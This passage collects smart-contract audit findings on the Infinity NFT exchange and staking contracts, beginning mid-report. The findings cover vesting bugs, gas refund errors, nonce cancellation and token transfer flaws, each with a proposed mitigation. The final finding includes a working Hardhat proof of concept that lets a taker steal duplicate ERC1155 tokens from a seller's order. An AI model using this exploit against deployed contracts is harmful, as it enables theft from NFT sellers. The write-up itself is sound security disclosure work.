userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;         amount = amount - vestedThreeMonths;         if (amount > vestedSixMonths) {           userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;           userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;           amount = amount - vestedSixMonths;           if (amount > vestedTwelveMonths) {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;             userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;           } else {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;           }         } else {           userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;         }       } else {         userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;       }     } else {       userstakedAmounts[user][Duration.NONE].amount -= amount;     }   } ``` for example if `amount=noVesting` then code would execute line: `userstakedAmounts[user][Duration.NONE].amount -= amount;` which sets the `userstakedAmounts[user][Duration.NONE].amount` to `0x0` but `userstakedAmounts[user][Duration.NONE].timestamp` won't change. As as in all other logics when `amount` is `0x0` code set `timestamp` to `0x0` too but here that logic is not happening for this cases (amount equal to `noVesting` or `noVesting + vestedThreeMonths` or ...).  ## Tools Used VIM  ## Recommended Mitigation Steps change if conditions from `>` to `>=`, so for equal case the code set `timestamp` to `0x0` too.  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1062   # Vulnerability details  ## Impact If an NFT is sold that does not specify support for the ERC-721 or ERC-1155 standard interface, the sale will still succeed. In doing so, the seller will receive funds from the buyer, but the buyer will not receive any NFT from the seller. This could happen in the following cases: 1. a token that claims to be ERC-721/1155 compliant, but fails to implement the `supportsInterface()` function properly. 2. an NFT that follows a standard other than ERC-721/1155 and does not implement their EIP-165 interfaces. 3. a malicious contract that is deployed to take advantage of this behavior.   ## Proof of Concept https://gist.github.com/kylriley/3bf0e03d79b3d62dd5a9224ca00c4cb9  ## Tools Used N/A  ## Recommended Mitigation Steps If neither the ERC-721 nor the ERC-1155 interface is supported the function should revert. An alternative approach would be to attempt a `transferFrom` and check the balance before and after to ensure that it succeeded.  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L149 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L273   # Vulnerability details  ## Impact The way the gas refunds are computed in the InfinityExchange contract, the first orders pay less than the latter ones. This causes a loss of funds for the buyers whose orders came last in the batch.  ## Proof of Concept The issue is that the `startGasPerOrder` variable is computed within the for-loop. That causes the first iterations to be lower than later ones.  Here's an example for the following line: https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L202 To make the math easy we use the following values: ``` startGas = 1,000,000 gasPerOrder = 100,000 (so fulfilling an order costs us 100,000 gas) ordersLength = 10 ```  For the 2nd order we then get: ``` startGasPerOrder = 900,000 + ((1,000,000 + 20,000 - 900,000) / 10) startGasPerOrder = 912,000 ``` For the 9th order we get: ``` startGasPerOrder = 200,000 + ((1,000,000 + 20,000 - 200,000) / 10) startGasPerOrder = 282,000 ```  The `startGasPerOrder` variable is passed through a couple of functions without any modification until it reaches a line like this: https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L231  ```sol uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice; ```  There, the actual gas costs for the user are computed.  In our case, that would be:  ``` # 2nd order # gasleft() is 800,00 because we said that executing the order costs ~100,000 gas. At the beginning of the order, it was 900,000 so now it's 800,000. This makes the computation a little more straightforward although it's not 100% correct. gasCost = (912,000 - 800,000 + 50,000) * 1 gasCost = 162,000  # 9th order gasCost = (282,000 - 100,000 + 50,000) * 1 gasCost = 232,000 ```  So the 2nd order's buyer pays `162,000` while the 9th order's buyer pays `232,000`.  As I said the math was dumbed down a bit to make it easier. The actual difference might not be as big as shown here. But, there is a difference.  ## Tools Used none  ## Recommended Mitigation Steps The `startGasPerOrder` variable should be initialized *outside* the for-loop.  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L375-L402 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L507-L530   # Vulnerability details  ## Impact The current nonce is non-deterministic. This means that at any point in time, it is not possible to say what the current nonce for a given signer is.  **So, there is no way to cancel all pending orders.**  ## Proof of Concept Let's say there was a mass phishing attack on users and some signatures were phished.  Since the user does not know the nonce of the signatures that were signed by him/her, he/she cannot cancel it via `cancelMultipleOrders`.  And there is no way to cancel all pending orders. Since the nonce can be any arbitrary value, if the signature had a UINT256 MAX value, there is no way to cancel it via `cancelAllOrders`.  ## Tools Used VS Code  ## Recommended Mitigation Steps It is recommended to have a deterministic nonce, instead of a non-deterministic nonce. 1. Instead of tracking minNonce, we should track currentNonce. 2. Only allow one increment of the nonce. `cancelAllOrders` should increment the current nonce by 1. 3. Only signatures that match the currentNonce should be considered valid (exactly equal). 4. Instead of canceling orders by nonce, the hash map should be by order hash. So, `isUserOrderNonceExecutedOrCancelled[msg.sender][orderHash]` should be recorded.  If these steps are taken, any such phishing attack can be prevented by simply calling `cancelAllOrders` and incrementing the nonce, because the signature must match the current nonce, and so if the current nonce is incremented by 1, there will be a mismatch and will invalid all pending orders.  Also, specific listings can be canceled by `cancelMultipleOrders` which can check `isUserOrderNonceExecutedOrCancelled[msg.sender][orderHash]`  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/staking/InfinityStaker.sol#L290-L325   # Vulnerability details  ## Impact Following scenario:  Alice has staked X token for 6 months that have vested. She stakes Y tokens for another three months. If she now calls `unstake(X)` to take out the tokens that have vested, the Y tokens she staked for three months will be locked up.  ## Proof of Concept First, here's a test showcasing the issue:  ```js   describe('should cause trouble', () => {     it('should lock up funds', async function () {       await approveERC20(signer1.address, token.address, amountStaked, signer1, infinityStaker.address);       await infinityStaker.connect(signer1).stake(amountStaked, 2);       await network.provider.send("evm_increaseTime", [181 * DAY]);       await network.provider.send('evm_mine', []);              // The funds we staked for 6 months have vested       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);        // Now we want to stake funds for three months       await approveERC20(signer1.address, token.address, amountStaked2, signer1, infinityStaker.address);       await infinityStaker.connect(signer1).stake(amountStaked2, 1);        // total staked is now the funds staked for three & six months       // total vested stays the same       expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(amountStaked.add(amountStaked2));       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(amountStaked);        // we unstake the funds that are already vested.       const userBalanceBefore = await token.balanceOf(signer1.address);       await infinityStaker.connect(signer1).unstake(amountStaked);       const userBalanceAfter = await token.balanceOf(signer1.address);        expect(userBalanceAfter).to.eq(userBalanceBefore.add(amountStaked));        expect(await infinityStaker.getUserTotalStaked(signer1.address)).to.eq(ethers.BigNumber.from(0));       expect(await infinityStaker.getUserTotalVested(signer1.address)).to.eq(ethers.BigNumber.from(0));     });   }); ```  The test implements the scenario I've described above. In the end, the user got back their `amountStaked` tokens with the `amountStaked2` tokens being locked up in the contract. The user has no tokens staked at the end.  The issue is in the `_updateUserStakedAmounts()` function:  ```sol     if (amount > noVesting) {       userstakedAmounts[user][Duration.NONE].amount = 0;       userstakedAmounts[user][Duration.NONE].timestamp = 0;       amount = amount - noVesting;       if (amount > vestedThreeMonths) {         // MAIN ISSUE:         // here `vestedThreeMonths` is 0. The current staked tokens are set to `0` and `amount` is decreased by `0`.         // Since `vestedThreeMonths` is `0` we shouldn't decrease `userstakedAmounts` at all here.         userstakedAmounts[user][Duration.THREE_MONTHS].amount = 0;         userstakedAmounts[user][Duration.THREE_MONTHS].timestamp = 0;         amount = amount - vestedThreeMonths;         // `amount == vestedSixMonths` so we enter the else block         if (amount > vestedSixMonths) {           userstakedAmounts[user][Duration.SIX_MONTHS].amount = 0;           userstakedAmounts[user][Duration.SIX_MONTHS].timestamp = 0;           amount = amount - vestedSixMonths;           if (amount > vestedTwelveMonths) {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount = 0;             userstakedAmounts[user][Duration.TWELVE_MONTHS].timestamp = 0;           } else {             userstakedAmounts[user][Duration.TWELVE_MONTHS].amount -= amount;           }         } else {           // the staked amount is set to `0`.           userstakedAmounts[user][Duration.SIX_MONTHS].amount -= amount;         }       } else {         userstakedAmounts[user][Duration.THREE_MONTHS].amount -= amount;       }     } else {       userstakedAmounts[user][Duration.NONE].amount -= amount;     } ```   ## Tools Used none  ## Recommended Mitigation Steps Don't set `userstakedAmounts.amount` to `0` if none of its tokens are removed (`vestedAmount == 0`)  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1062-L1072   # Vulnerability details  ## Impact  Many real-world NFT tokens may support both ERC721 and ERC1155 standards, which may break `InfinityExchange::_transferNFTs`, i.e., transferring less tokens than expected.  For example, the asset token of [The Sandbox Game](https://www.sandbox.game/en/), a Top20 ERC1155 token on [Etherscan](https://etherscan.io/tokens-nft1155?sort=7d&order=desc), supports both ERC1155 and ERC721 interfaces. Specifically, any ERC721 token transfer is regarded as an ERC1155 token transfer with only one item transferred ([token address](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5) and [implementation](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L14)).  Assuming there is a user tries to buy two tokens of Sandbox's ASSETs with the same token id, the actual transferring is carried by `InfinityExchange::_transferNFTs` which first checks ERC721 interface supports and then ERC1155.  ```solidity=   function _transferNFTs(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {       _transferERC721s(from, to, item);     } else if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {       _transferERC1155s(from, to, item);     }   } ```  The code will go into `_transferERC721s` instead of `_transferERC1155s`, since the Sandbox's ASSETs also support ERC721 interface. Then,   ```solidity=   function _transferERC721s(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     uint256 numTokens = item.tokens.length;     for (uint256 i = 0; i < numTokens; ) {       IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);       unchecked {         ++i;       }     }   } ```  Since the `ERC721(item.collection).safeTransferFrom` is treated as an ERC1155 transferring with one item ([reference](https://etherscan.io/address/0x7fbf5c9af42a6d146dcc18762f515692cd5f853b#code#F2#L833)), there is only one item actually gets traferred.  That means, the user, who barely know the implementation details of his NFTs, will pay the money for two items but just got one.  Note that the situation of combining ERC721 and ERC1155 is prevalent and poses a great vulnerability of the exchange contract.     ## Proof of Concept Check the return values of [Sandbox's ASSETs](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5)'s `supportInterface`, both `supportInterface(0x80ac58cd)` and `supportInterface(0xd9b67a26)` return true.   ## Tools Used Manual Inspection  ## Recommended Mitigation Steps Reorder the checks,e.g.,   ```solidity=   function _transferNFTs(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {       _transferERC1155s(from, to, item);     } else if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {       _transferERC721s(from, to, item);     }   } ```   
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243   # Vulnerability details  ## Impact When any user provides a `sellOrder` and they are trying to sell multiple tokens from _n_ (n > 1) different `ERC1155` collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.  In short, hackers can violate the user-defined orders.  ## Root Cause The logic of `canExecTakeOrder` and `canExecMatchOneToMany` is not correct.  __Let's `canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems) ` as an example, while `canExecMatchOneToMany` shares the same error.__   Specifically, it first checks whether the number of selling item in `makerOrder` matches with the ones in `takerItems`. Note that the number is an aggregated one. Then, it check whether all the items in `takerItems` are within the scope defined by `makerOrder`.  The problem comes when there are duplicated items in `takerItems`. The aggregated number would be correct and all taker's Items are indeed in the order. However, it does not means `takerItems` exactly matches all items in `makerOrder`, which means violation of the order.  For example, if the order requires ``` [     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     },     {           collection: mock1155Contract2.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     } ];  ```  and the taker provides ``` [     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     },     {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]     } ]; ```  The taker can grabs two `mock1155Contract1` tokens by paying the order which tries to sell a `mock1155Contract1` token and a `mock1155Contract2` token. When `mock1155Contract1` is much more expensive, the victim user will suffer from a huge loss.  As for the approving issue, the users may grant the contract unlimited access, or they may have another order which sells `mock1155Contract1` tokens. The attack is easy to perform.  ## Proof of Concept First put the `MockERC1155.sol` under the `contracts/` directory: ```solidity  // SPDX-License-Identifier: MIT pragma solidity 0.8.14; import {ERC1155URIStorage} from '@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol'; import {ERC1155} from '@openzeppelin/contracts/token/ERC1155/ERC1155.sol'; import {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';  contract MockERC1155 is ERC1155URIStorage, Ownable {   uint256 numMints;    constructor(string memory uri) ERC1155(uri) {}    function mint(address to, uint256 id, uint256 amount, bytes memory data) external onlyOwner {     super._mint(to, id, amount, data);   } } ```  And then put `poc.js` under the `test/` directory. ```js const { expect } = require('chai'); const { ethers, network } = require('hardhat'); const { deployContract, NULL_ADDRESS, nowSeconds } = require('../tasks/utils'); const {   getCurrentSignedOrderPrice,   approveERC20,   grantApprovals,   signOBOrder } = require('../helpers/orders');  async function prepare1155OBOrder(user, chainId, signer, order, infinityExchange) {   // grant approvals   const approvals = await grantApprovals(user, order, signer, infinityExchange.address);   if (!approvals) {     return undefined;   }    // sign order   const signedOBOrder = await signOBOrder(chainId, infinityExchange.address, order, signer);    const isSigValid = await infinityExchange.verifyOrderSig(signedOBOrder);   if (!isSigValid) {     console.error('Signature is invalid');     return undefined;   }   return signedOBOrder; }  describe('PoC', function () {   let signers,     dev,     matchExecutor,     victim,     hacker,     token,     infinityExchange,     mock1155Contract1,     mock1155Contract2,     obComplication    const sellOrders = [];    let orderNonce = 0;    const UNIT = toBN(1e18);   const INITIAL_SUPPLY = toBN(1_000_000).mul(UNIT);    const totalNFTSupply = 100;   const numNFTsToTransfer = 50;   const numNFTsLeft = totalNFTSupply - numNFTsToTransfer;    function toBN(val) {     return ethers.BigNumber.from(val.toString());   }    before(async () => {     // signers     signers = await ethers.getSigners();     dev = signers[0];     matchExecutor = signers[1];     victim = signers[2];     hacker = signers[3];     // token     token = await deployContract('MockERC20', await ethers.getContractFactory('MockERC20'), signers[0]);      // NFT constracts (ERC1155)     mock1155Contract1 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [       'uri1'     ]);     mock1155Contract2 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [       'uri2'     ]);      // Exchange     infinityExchange = await deployContract(       'InfinityExchange',       await ethers.getContractFactory('InfinityExchange'),       dev,       [token.address, matchExecutor.address]     );      // OB complication     obComplication = await deployContract(       'InfinityOrderBookComplication',       await ethers.getContractFactory('InfinityOrderBookComplication'),       dev     );      // add currencies to registry     await infinityExchange.addCurrency(token.address);     await infinityExchange.addCurrency(NULL_ADDRESS);      // add complications to registry     await infinityExchange.addComplication(obComplication.address);      // send assets     await token.transfer(victim.address, INITIAL_SUPPLY.div(4).toString());     await token.transfer(hacker.address, INITIAL_SUPPLY.div(4).toString());     for (let i = 0; i < numNFTsToTransfer; i++) {       await mock1155Contract1.mint(victim.address, i, 50, '0x');       await mock1155Contract2.mint(victim.address, i, 50, '0x');     }   });    describe('StealERC1155ByDuplicateItems', () => {     it('Passed test denotes successful hack', async function () {       // prepare order       const user = {         address: victim.address       };       const chainId = network.config.chainId ?? 31337;       const nfts = [         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         },         {           collection: mock1155Contract2.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         }       ];       const execParams = { complicationAddress: obComplication.address, currencyAddress: token.address };       const extraParams = {};       const nonce = ++orderNonce;       const orderId = ethers.utils.solidityKeccak256(['address', 'uint256', 'uint256'], [user.address, nonce, chainId]);       let numItems = 0;       for (const nft of nfts) {         numItems += nft.tokens.length;       }       const order = {         id: orderId,         chainId,         isSellOrder: true,         signerAddress: user.address,         numItems,         startPrice: ethers.utils.parseEther('1'),         endPrice: ethers.utils.parseEther('1'),         startTime: nowSeconds(),         endTime: nowSeconds().add(10 * 60),         nonce,         nfts,         execParams,         extraParams       };       const sellOrder = await prepare1155OBOrder(user, chainId, victim, order, infinityExchange);       expect(sellOrder).to.not.be.undefined;        // form matching nfts       const nfts_ = [         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         },         {           collection: mock1155Contract1.address,           tokens: [{ tokenId: 0, numTokens: 1 }]         }       ];        // approve currency       let salePrice = getCurrentSignedOrderPrice(sellOrder);       await approveERC20(hacker.address, token.address, salePrice, hacker, infinityExchange.address);        // perform exchange       await infinityExchange.connect(hacker).takeOrders([sellOrder], [nfts_]);        // owners after sale       // XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1       // When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge loss       expect(await mock1155Contract1.balanceOf(hacker.address, 0)).to.equal(2);     });   }); }); ```  And run  ```bash $ npx hardhat test --grep PoC    PoC     StealERC1155ByDuplicateItems       ✓ Passed test denotes successful hack ```  Note that the passed test denotes a successful hack.  ## Tools Used Manual inspection.  ## Recommended Mitigation Steps I would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.  
